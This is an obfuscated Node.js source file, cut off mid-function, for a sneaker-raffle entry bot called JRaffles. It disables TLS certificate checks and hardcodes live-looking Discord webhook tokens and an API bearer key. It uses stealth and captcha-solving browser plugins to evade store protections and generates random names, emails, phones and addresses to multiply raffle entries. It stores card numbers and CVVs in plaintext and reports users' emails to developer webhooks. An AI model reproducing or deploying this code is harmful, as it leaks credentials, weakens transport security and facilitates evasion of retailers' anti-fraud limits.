process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x768c3f = require('fs'), _0x5a0fde = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x3c0829(_0xa8cebf) {
    const _0x322861 = _0x768c3f['createWriteStream'](_0xa8cebf, { 'flags': 'a' }), _0x583d10 = console['log'];
    console['log'] = function () {
        const _0x305040 = Array['prototype']['slice']['call'](arguments), _0x3fa857 = _0x305040['join']('\x20') + '\x0a';
        _0x322861['write'](_0x3fa857), _0x583d10['apply'](console, _0x305040);
    };
}
_0x3c0829('../logs/log\x20' + _0x5a0fde);
var _0x184a3c = require('tough-cookie'), _0x54228e = require('node-imap'), _0x34e016 = require('util')['inspect'];
const _0x4a3e33 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x130ca6 } = require('discord.js');
var _0x45483f = require('exe');
const { execFile: _0x5d2436 } = require('child_process'), _0x145da3 = require('puppeteer-extra'), _0x29f0f6 = require('puppeteer-extra-plugin-recaptcha'), _0x109835 = require('puppeteer-extra-plugin-stealth'), _0x4fb298 = require('chalk'), _0x39f641 = require('node-bash-title'), _0x49fa88 = require('axios'), _0x38692b = require('papaparse');
var _0x3a726b = require('random-name');
const _0x589558 = require('request');
var _0x1bacab = require('prompt');
const _0x456e65 = _0x589558['jar']();
var _0x4b1e6b = {};
const _0x1cccea = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x52e2dc = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x1c7d0b = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x339d09 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4dbdf2 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x14f19f = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x4d7461 = 'https://discord.com/api/webhooks/', _0x22d1a8 = '' + _0x4d7461 + _0x1c7d0b, _0x48932d = '' + _0x4d7461 + _0x339d09, _0x4f7f5d = '' + _0x4d7461 + _0x1cccea, _0x874ee1 = '' + _0x4d7461 + _0x52e2dc, _0x4807c3 = '' + _0x4d7461 + _0x4dbdf2, _0x240706 = '' + _0x4d7461 + _0x14f19f;
const _0x384b1f = JSON['parse'](_0x768c3f['readFileSync']('../package.json', 'utf-8')), _0x1701ba = _0x384b1f['version'];
var _0x4c637b, _0x1792f9, _0x33e407, _0x3b3dc2, _0x1d26f5, _0x283e36, _0x3d4e83, _0x5f94c8;
const _0x164154 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x5f37c0 = ![];
const _0x57c9bf = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x364abd = '0123456789';
var _0x1b2d1f = _0x57c9bf['split']('');
const _0x58db0a = require('auto-git-update'), _0x2ad812 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x43a114 = new _0x58db0a(_0x2ad812);
async function _0x14e67a() {
    _0x1d26f5 = _0x768c3f['readdirSync']('../proxies'), _0x3b3dc2 = _0x768c3f['readdirSync']('../tasks'), !_0x768c3f['existsSync']('../accounts/fenom.csv') && _0x768c3f['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x768c3f['existsSync']('../accounts/paypal.csv') && _0x768c3f['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x768c3f['existsSync']('../accounts/bstn.csv') && _0x768c3f['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x768c3f['existsSync']('../accounts/eql.csv') && _0x768c3f['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x768c3f['existsSync']('../failed-tasks.csv') && _0x768c3f['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x768c3f['existsSync']('../successful-tasks.csv') && _0x768c3f['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x4b1e6b = JSON['parse'](_0x768c3f['readFileSync']('../settings.json', 'utf-8')), !_0x4b1e6b['delay'] && (_0x4b1e6b['delay'] = 0x3c, _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), !_0x4b1e6b['threads'] && (_0x4b1e6b['threads'] = 0x1, _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), !_0x4b1e6b['masterMail'] && (_0x4b1e6b['masterMail'] = 'yourmail@gmail.com', _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), !_0x4b1e6b['masterPassword'] && (_0x4b1e6b['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), !_0x4b1e6b['captchaKey'] && (_0x4b1e6b['captchaKey'] = '', _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), !_0x4b1e6b['useRandomProxy'] && (_0x4b1e6b['useRandomProxy'] = !![], _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), !_0x4b1e6b['shuffleTasks'] && (_0x4b1e6b['shuffleTasks'] = ![], _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), !_0x4b1e6b['webhook'] && (_0x4b1e6b['webhook'] = '', _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), _0x4b1e6b['delay'] <= 0x1388 && (_0x4b1e6b['delay'] = _0x4b1e6b['delay'] * 0x3e8), _0x4b1e6b['AfewDelay'] && (delete _0x4b1e6b['AfewDelay'], _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), _0x4b1e6b['MahaDelay'] && (delete _0x4b1e6b['MahaDelay'], _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), _0x4b1e6b['footshopDelay'] && (delete _0x4b1e6b['footshopDelay'], _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b, null, 0x2))), _0x4b1e6b['MahaDelay'] = _0x4b1e6b['delay'], _0x4d7461 = _0x4b1e6b['webhook'], _0x283e36 = _0x4b1e6b['licenseKey'];
}
let _0x164c3d, _0x3191c2 = [], _0x1de284;
const _0x590479 = _0x20a1db => new Promise(_0xa5baf2 => setTimeout(_0xa5baf2, _0x20a1db));
function _0x4e8668(_0x15ad34, _0x244bd6) {
    return Math['floor'](Math['random']() * (_0x244bd6 - _0x15ad34 + 0x1) + _0x15ad34);
}
function _0x155463(_0x20731c) {
    let _0x1f09c2 = _0x20731c['length'], _0x3e33ea;
    while (_0x1f09c2 != 0x0) {
        _0x3e33ea = Math['floor'](Math['random']() * _0x1f09c2), _0x1f09c2--, [_0x20731c[_0x1f09c2], _0x20731c[_0x3e33ea]] = [
            _0x20731c[_0x3e33ea],
            _0x20731c[_0x1f09c2]
        ];
    }
    return _0x20731c;
}
async function _0x210e72(_0x317203) {
    return _0x49fa88['get']('https://api.hyper.co/v4/licenses/' + _0x317203, { 'headers': { 'Authorization': 'Bearer\x20' + _0x164154 } })['then'](_0x31903c => _0x31903c['data'])['catch'](() => null);
}
;
async function _0x50d7e1(_0x219745) {
    console['clear']();
    if (_0x219745 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x46f6f2 = await _0x1bacab['get']('License');
        if (_0x46f6f2['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x590479(0xbb8), _0x50d7e1(_0x219745);
        _0x219745 = _0x46f6f2['License'], _0x4b1e6b['licenseKey'] = _0x219745, _0x283e36 = _0x219745, _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b));
    }
    console['log']('Checking\x20license\x20' + _0x283e36 + '...'), await _0x590479(0x320);
    const _0x2aaac5 = await _0x210e72(_0x219745);
    _0x3d4e83 = JSON['stringify'](_0x2aaac5['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x5f94c8 = JSON['stringify'](_0x2aaac5['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x2aaac5)
        return console['log']('License\x20not\x20found');
    if (!_0x2aaac5['user'])
        return console['log']('License\x20not\x20bound');
    return _0x2aaac5['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x5f37c0 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x5f37c0 = ![]);
}
async function _0x101370() {
    var _0x355fb1 = await _0x1bacab['get']('Module');
    return console['clear'](), _0x355fb1['Module'];
}
;
async function _0x2ea2f0() {
    var _0x39d5e5 = await _0x1bacab['get']('Setting');
    return console['clear'](), _0x39d5e5['Setting'];
}
async function _0x1f3dde(_0x473d5d) {
    var _0x40d6c8 = [];
    for (file of _0x3b3dc2) {
        var _0x32a46c = _0x768c3f['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x38692b['parse'](_0x32a46c, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x473d5d['store'] && _0x40d6c8['push'](file);
    }
    !_0x40d6c8['length'] == 0x0 && (_0x3b3dc2 = _0x40d6c8);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x7f35b4 = 0x0; _0x7f35b4 < _0x3b3dc2['length']; _0x7f35b4++) {
        console['log']('\x20(' + _0x7f35b4 + ')\x20' + _0x3b3dc2[_0x7f35b4]);
    }
    console['log']('');
    var _0x49e76a = await _0x1bacab['get']('Task');
    if (_0x49e76a['Task'] > _0x3b3dc2['length'] - 0x1 || isNaN(_0x49e76a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x590479(0x3e8), _0x1f3dde();
    var _0x3633e8 = _0x768c3f['readFileSync']('../tasks/' + _0x3b3dc2[_0x49e76a['Task']], 'utf-8');
    return _0x33e407 = _0x38692b['parse'](_0x3633e8, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x4fb298['blue'](_0x3b3dc2[_0x49e76a['Task']])), _0x4c637b = _0x3b3dc2[_0x49e76a['Task']], _0x33e407;
}
async function _0x2fefe9() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x46e757 = 0x0; _0x46e757 < _0x1d26f5['length']; _0x46e757++) {
        console['log']('\x20(' + _0x46e757 + ')\x20' + _0x1d26f5[_0x46e757]);
    }
    console['log']('');
    var _0x4cb157 = await _0x1bacab['get']('Proxies');
    if (_0x4cb157['Proxies'] > _0x1d26f5['length'] - 0x1 || isNaN(_0x4cb157['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x590479(0x3e8), _0x2fefe9();
    var _0x1e2242 = _0x768c3f['readFileSync']('../proxies/' + _0x1d26f5[_0x4cb157['Proxies']], 'utf-8')['split']('\x0a');
    let _0x80bf0c = _0x1e2242['map']((_0x5d5ee9, _0x559175) => {
        sanatizeProxy = _0x5d5ee9['replace']('\x0d', '');
        if (_0x1e2242[_0x559175 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1792f9 = _0x1d26f5[_0x4cb157['Proxies']], console['clear'](), _0x80bf0c;
}
async function _0x2a73f1() {
    var _0x2eed24 = await _0x1bacab['get']('Value');
    return console['clear'](), _0x2eed24['Value'];
}
async function _0x3870e9(_0xc6440b) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x463b9f = 0x0; _0x463b9f < _0xc6440b['length']; _0x463b9f++) {
        console['log']('\x20(' + _0x463b9f + ')\x20[' + _0xc6440b[_0x463b9f]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x3d74ba = await _0x1bacab['get']('Module');
    return _0x3d74ba['Module'];
}
async function _0x105c1a() {
    var _0x2f3746 = await _0x1bacab['get']('Password');
    return console['clear'](), _0x2f3746['Password'];
}
;
async function _0xd5ab41() {
    var _0x2f89a0 = await _0x1bacab['get']('Links');
    return _0x2f89a0['Links'];
}
;
async function _0x1f34c7() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x11d85f = 0x0; _0x11d85f < _0x3191c2['length']; _0x11d85f++) {
        console['log']('\x20(' + _0x11d85f + ')\x20' + _0x3191c2[_0x11d85f]);
    }
    ;
    console['log']();
    let _0x589e91 = await _0x1bacab['get']('Product');
    return console['clear'](), _0x589e91['Product'];
}
;
function _0x4786af() {
    var _0x5e9887 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x5e9887;
}
;
function _0x2ed440() {
    var _0x580e26 = new Date(Date['now']())['toLocaleString']();
    return _0x580e26['replace'](',', '');
}
async function _0x1690f0(_0x832511, _0x57f65e) {
    let _0x27621e = { 'headers': { 'content-type': 'application/json' } };
    if (_0x1701ba != 'devkey') {
        await _0x49fa88['post'](_0x832511, _0x57f65e, _0x27621e);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x54f36f(_0x534972, _0x5e82c3, _0x3cd30e, _0x2933be, _0x4b8426) {
    if (!_0x2933be && _0x3cd30e == 'dev') {
        var _0x40926d = new _0x130ca6()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x5e82c3['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x5e82c3['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x534972['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x4b1e6b['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x3d4e83,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x534972['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x534972['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x1701ba,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x40926d['data'];
    } else {
        if (_0x2933be && _0x3cd30e == 'dev') {
            var _0x40926d = new _0x130ca6()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x5e82c3['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x3d4e83,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x5e82c3['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x534972['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x4b1e6b['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x4b8426,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x534972['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x534972['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x1701ba,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x40926d['data'];
        } else {
            if (_0x3cd30e == 'pub') {
                var _0x40926d = new _0x130ca6()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x5e82c3['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x5e82c3['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x534972['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x4b1e6b['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x534972['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x1701ba,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x40926d['data'];
            } else {
                if (_0x3cd30e == 'acc' && !_0x2933be) {
                    var _0x40926d = new _0x130ca6()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x5e82c3['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x3d4e83,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x5e82c3['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x4b1e6b['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x1701ba,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x40926d['data'];
                } else {
                    if (_0x3cd30e == 'acc' && _0x2933be) {
                        var _0x40926d = new _0x130ca6()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x5e82c3['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x3d4e83,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x4b8426,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x5e82c3['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x4b1e6b['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x1701ba,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x40926d['data'];
                    } else {
                        if (_0x3cd30e == 'open') {
                            var _0x40926d = new _0x130ca6()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x5f94c8)['addFields']({
                                'name': 'User',
                                'value': '' + _0x3d4e83,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x1701ba,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x40926d['data'];
                        } else {
                            if (!_0x2933be && _0x3cd30e == 'ver') {
                                var _0x40926d = new _0x130ca6()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x5e82c3['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x3d4e83,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x5e82c3['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x4b1e6b['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x1701ba,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x40926d['data'];
                            } else {
                                if (_0x2933be && _0x3cd30e == 'ver') {
                                    var _0x40926d = new _0x130ca6()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x5e82c3['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x3d4e83,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x4b8426,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x5e82c3['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x4b1e6b['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x1701ba,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x40926d['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x46b8ee(_0x32d0d7, _0x4632ec) {
    var _0x4af7ff = _0x32d0d7[_0x4632ec]['Address1']['split'](''), _0x6dc3a = _0x32d0d7[_0x4632ec]['Address2']['split'](''), _0x3e48a5 = _0x32d0d7[_0x4632ec]['Email']['split']('@');
    for (var _0xeaf117 = 0x0; _0xeaf117 < _0x4af7ff['length']; _0xeaf117++) {
        if (_0x4af7ff[_0xeaf117] == 'X') {
            var _0x2fe38c = Math['round'](Math['random']() * (_0x57c9bf['length'] - 0x1));
            _0x4af7ff[_0xeaf117] = _0x1b2d1f[_0x2fe38c];
        }
    }
    ;
    for (var _0xeaf117 = 0x0; _0xeaf117 < _0x6dc3a['length']; _0xeaf117++) {
        if (_0x6dc3a[_0xeaf117] == 'X') {
            var _0x2fe38c = Math['round'](Math['random']() * (_0x57c9bf['length'] - 0x1));
            _0x6dc3a[_0xeaf117] = _0x1b2d1f[_0x2fe38c];
        }
    }
    ;
    _0x32d0d7[_0x4632ec]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x32d0d7[_0x4632ec]['FirstName'] = _0x3a726b['first']());
    _0x32d0d7[_0x4632ec]['LastName']['toUpperCase']() == 'RANDOM' && (_0x32d0d7[_0x4632ec]['LastName'] = _0x3a726b['last']());
    _0x3e48a5[0x0]['toUpperCase']() == 'RANDOM' ? _0x3e48a5[0x0] = '' + _0x3a726b['first']() + _0x3a726b['last']() + _0x4e8668(0x1, 0x270f) + '@' : _0x3e48a5[0x0] = _0x3e48a5[0x0] + '@';
    _0x32d0d7[_0x4632ec]['Email'] = _0x3e48a5['join'](''), _0x32d0d7[_0x4632ec]['Address1'] = _0x4af7ff['join'](''), _0x32d0d7[_0x4632ec]['Address2'] = _0x6dc3a['join']('');
    _0x32d0d7[_0x4632ec]['Phone'] == 'RANDOM' && (_0x32d0d7[_0x4632ec]['Phone'] = '0' + _0x4e8668(0x5f5e100, 0x3b9ac9ff));
    if (_0x32d0d7[_0x4632ec]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x438c55 = _0x4e8668(0x1, 0x270f);
        _0x32d0d7[_0x4632ec]['Follower'] = '' + _0x3a726b['first']() + _0x3a726b['last']() + _0x438c55 + '\x20';
    }
    _0x32d0d7[_0x4632ec]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x32d0d7[_0x4632ec]['HouseNumber'] = _0x4e8668(0x1, 0xc8));
    if (_0x32d0d7[_0x4632ec]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x308549 = Math['round'](Math['random']() * (_0x57c9bf['length'] - 0x1)), _0x175519 = _0x1b2d1f[_0x308549];
        _0x32d0d7[_0x4632ec]['Address1'] = _0x3a726b['last']() + 'straat', _0x32d0d7[_0x4632ec]['Zip'] == '' && (_0x32d0d7[_0x4632ec]['Postcode'] = _0x4e8668(0x3e8, 0x270f) + '\x20' + _0x175519 + _0x175519, _0x32d0d7[_0x4632ec]['Zip'] = _0x32d0d7[_0x4632ec]['Postcode']), _0x32d0d7[_0x4632ec]['HouseNumber'] = '' + _0x4e8668(0x1, 0xc8);
    }
    return;
}
;
async function _0x549c32(_0x788d44, _0x5b27c9) {
    _0x768c3f['appendFileSync']('../failed-tasks.csv', _0x2ed440() + ',' + _0x5b27c9['store'] + ',' + _0x5b27c9['name'] + ',' + _0x788d44['Url'] + ',' + _0x788d44['Size'] + ',' + _0x788d44['Follower'] + ',' + _0x788d44['FirstName'] + ',' + _0x788d44['LastName'] + ',' + _0x788d44['Address1'] + ',' + _0x788d44['Address2'] + ',' + _0x788d44['HouseNumber'] + ',' + _0x788d44['Zip'] + ',' + _0x788d44['City'] + ',' + _0x788d44['State'] + ',' + _0x788d44['Country'] + ',' + _0x788d44['Phone'] + ',' + _0x788d44['Email'] + ',' + _0x788d44['Password'] + ',' + _0x788d44['PaymentMethod'] + ',' + _0x788d44['CardType'] + ',' + _0x788d44['NameOnCard'] + ',' + _0x788d44['CardNumber'] + ',' + _0x788d44['ExpiryDate'] + ',' + _0x788d44['CVV'] + ',' + _0x788d44['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x491fd3(_0x31191c, _0x419c3b) {
    _0x768c3f['appendFileSync']('../successful-tasks.csv', _0x2ed440() + ',' + _0x419c3b['store'] + ',' + _0x419c3b['name'] + ',' + _0x31191c['Url'] + ',' + _0x31191c['Size'] + ',' + _0x31191c['Follower'] + ',' + _0x31191c['FirstName'] + ',' + _0x31191c['LastName'] + ',' + _0x31191c['Address1'] + ',' + _0x31191c['Address2'] + ',' + _0x31191c['HouseNumber'] + ',' + _0x31191c['Zip'] + ',' + _0x31191c['City'] + ',' + _0x31191c['State'] + ',' + _0x31191c['Country'] + ',' + _0x31191c['Phone'] + ',' + _0x31191c['Email'] + ',' + _0x31191c['Password'] + ',' + _0x31191c['PaymentMethod'] + ',' + _0x31191c['CardType'] + ',' + _0x31191c['NameOnCard'] + ',' + _0x31191c['CardNumber'] + ',' + _0x31191c['ExpiryDate'] + ',' + _0x31191c['CVV'] + ',' + _0x31191c['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x31ccd1() {
    let _0x4dea58 = proxyFile['split']('\x0a'), _0x4ee64a = _0x4dea58['map']((_0x30c3c8, _0x2b2e0f) => {
        sanatizeProxy = _0x30c3c8['replace']('\x0d', '');
        if (_0x4dea58[_0x2b2e0f + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4ee64a;
}
;
async function _0x2cde91(_0x4fe0e4, _0x236d52) {
    if (_0x3c74f5 != 'yes')
        var _0x3c74f5 = '', _0x23ac29 = 0x0;
    async function _0x835893() {
        var _0x3ebbc5 = _0x768c3f['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x5ee413 = _0x38692b['parse'](_0x3ebbc5, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x140ad2 = 0x0; _0x140ad2 < _0x5ee413['length']; _0x140ad2++) {
            console['log']('(' + _0x140ad2 + ')\x20' + _0x5ee413[_0x140ad2]['Email']);
        }
        console['log']('\x0a(' + _0x5ee413['length'] + ')\x20' + _0x4fb298['cyan']('Add\x20a\x20new\x20account'));
        let _0x446889 = await _0x1bacab['get']('Option');
        if (_0x446889['Option'] < _0x5ee413['length'])
            return _0x5ee413[_0x446889['Option']];
